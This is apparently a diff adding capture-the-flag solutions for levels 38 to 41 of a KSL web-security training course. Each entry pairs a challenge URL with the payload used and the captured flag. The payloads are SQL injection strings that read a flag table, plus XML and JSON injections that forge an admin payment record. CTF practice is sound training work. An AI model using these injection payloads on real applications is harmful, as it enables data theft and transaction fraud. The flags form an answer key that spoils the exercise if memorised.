+KSL{ec3258cf548bea70fe18e125fea8be3a}
+
+38) http://kslweb1.spb.ctf.su/fourth/level31/
+
+a')) UNION SELECT 1, flag, 3 from flag -- 
+
+->
+
+S1NMezJhMjc2N2EyYWM4NmI5NWQ5OGVjZTJhNzE2NmM3YWNhfQ==
+
+---
+
+https://www.dcode.fr/base-64-encoding
+
+->
+
+KSL{2a2767a2ac86b95d98ece2a7166c7aca}
+
+39) http://kslweb1.spb.ctf.su/fourth/level32/
+
+test@test.ru', (SELECT flag FROM flag WHERE part=1)) -- 
+
+->
+
+KSL{5117b6c275e13e04a4db9ac8564a8493}
+
+40) https://kslweb3.spb.ctf.su/2-1/
+
+test</comment></payment><payment><sender>admin</sender><receiver>me</receiver><amount>999999</amount><comment>flag
+
+->
+
+KSL{c21625af357afa5cc6b64f901fe41729}
+
+41) https://kslweb3.spb.ctf.su/2-2/
+
+"},{"sender": "admin", "receiver": "me", "amount": "1", "comment": "flag
+
+->
+
+KSL{9761d20b000c82c5b974f3b744d3d529}
